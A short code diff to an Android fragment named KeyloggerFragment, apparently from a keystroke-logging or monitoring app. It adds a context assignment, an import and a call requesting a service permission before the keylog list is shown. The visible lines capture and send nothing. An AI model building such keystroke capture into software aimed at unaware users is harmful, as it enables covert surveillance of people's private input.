@@ -35,6 +35,7 @@ import retrofit2.Callback;
 import retrofit2.Response;
 import timber.log.Timber;
 
+import static org.osmdroid.api.IMapView.LOGTAG;
 
 
 public class KeyloggerFragment extends Fragment {
@@ -55,6 +56,7 @@ public class KeyloggerFragment extends Fragment {
                              Bundle savedInstanceState) {
 
         View v = inflater.inflate(R.layout.fragment_keylog, container, false);
+        contextOfApplication = this.getContext();
 
 
         return v;
@@ -67,6 +69,7 @@ public class KeyloggerFragment extends Fragment {
 
 
         if (getView() != null) {
+            askForServicePermission();
             keyloggerAdapter = new KeyloggerAdapter();
             keylogger_recycler = getView().findViewById(R.id.keylogger_recycler);
             keylogger_recycler.setLayoutManager(new LinearLayoutManager(getContext()));
